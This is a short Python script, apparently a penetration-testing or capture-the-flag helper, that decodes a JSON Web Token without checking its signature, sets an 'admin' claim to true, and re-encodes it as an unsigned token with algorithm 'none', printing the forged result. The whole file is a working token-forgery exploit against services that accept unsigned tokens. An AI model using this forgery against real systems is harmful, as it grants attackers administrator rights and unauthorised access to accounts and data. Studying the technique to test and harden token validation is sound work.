#!/usr/bin/env python3

# DEP:
# $ pip3 install pyjwt

import sys
import jwt

def decode(token):
    print(jwt.get_unverified_header(token))
    print(jwt.decode(token, verify=False))

if len(sys.argv) == 2:

    print('==============')
    print('ORIGINAL TOKEN')
    print('==============')
    token = sys.argv[1]
    decode(token)

    t = jwt.decode(token, verify=False)
    t.update({'admin': True})

    print('==============')
    print('MODIFIED TOKEN')
    print('==============')
    token = jwt.encode(t, '', algorithm=None)
    decode(token)
    print(token)
